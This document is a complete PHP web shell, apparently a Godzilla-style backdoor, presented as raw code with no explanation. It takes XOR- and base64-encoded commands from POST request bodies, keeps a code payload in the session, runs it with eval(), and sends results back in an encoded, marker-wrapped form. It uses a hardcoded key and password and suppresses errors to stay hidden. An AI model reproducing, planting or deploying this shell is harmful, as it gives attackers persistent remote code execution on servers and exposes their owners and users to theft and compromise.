<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }

    return $D;
}
$pass='3g@#';
$payloadName='payload';
$key='8c825e6452ea592d';
 $XML = simplexml_load_string(file_get_contents("php://input"));
 $data=encode(base64_decode(urldecode($XML->Param)),$key);
echo $XML->Param;
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (stripos($data,"getBasicsInfo")!==false){
try{
            $_SESSION[$payloadName]=encode($data,$key);
echo $_SESSION[$payloadName];
}catch(Exception $e){
echo($e);

}
        }

}



